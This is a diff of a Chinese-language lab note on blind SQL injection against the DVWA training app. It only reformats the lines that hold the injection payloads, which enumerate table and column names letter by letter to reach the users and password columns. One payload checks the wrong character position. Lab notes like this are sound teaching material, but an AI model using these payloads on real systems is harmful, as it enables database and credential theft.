@@ -20,23 +20,33 @@ DVWA-LOW-布尔盲注：
 得到库名为"dvwa"
 
 猜表名
-1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 3,1),1,1))=117 --     得出第4行表名第一个字母为"u",前面几个表不是用户信息
+1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 3,1),1,1))=117 -- 
+得出第4行表名第一个字母为"u",前面几个表不是用户信息
 猜表名第二个字母
-1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 3,1),2,1))=115 --     得出第4个表名第二个字母为"s"
+1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 3,1),2,1))=115 -- 
+得出第4个表名第二个字母为"s"
 猜表名第三个字母
-1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 3,1),3,1))=101 --     得出第4个表名第三个字母为"e"
+1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 3,1),3,1))=101 --  
+得出第4个表名第三个字母为"e"
 猜表名第四个字母
-1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 3,1),4,1))=114 --     得出第4个表名第四个字母为"r"
-1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 3,1),5,1))=115 --     得出第4个表名第五个字母为"s"
+1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 3,1),4,1))=114 --  
+得出第4个表名第四个字母为"r"
+1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 3,1),5,1))=115 -- 
+得出第4个表名第五个字母为"s"
 limit 6,1为NULL，最终得出表名用户为"users"
 
 猜列名
-1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 3,1),1,1))=117 --    得出第4行列名第一个字母为"u"
-1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 3,1),2,1))=115 --    得出第4行列名第二个字母为"s"
-1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 3,1),3,1))=101 --    得出第4行列名第三个字母为"e"
-1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 3,1),2,1))=114 --    得出第4行列名第四个字母为"r"
+1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 3,1),1,1))=117 -- 
+得出第4行列名第一个字母为"u"
+1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 3,1),2,1))=115 --  
+得出第4行列名第二个字母为"s"
+1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 3,1),3,1))=101 -- 
+得出第4行列名第三个字母为"e"
+1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 3,1),2,1))=114 -- 
+得出第4行列名第四个字母为"r"
 得出第一重要列信息为"user"
-1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 4,1),1,1))=112 --    得出第5行列名第一个字母为"p"
+1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 4,1),1,1))=112 -- 
+得出第5行列名第一个字母为"p"
 依次得出第5行信息为"password"
 
 猜密码
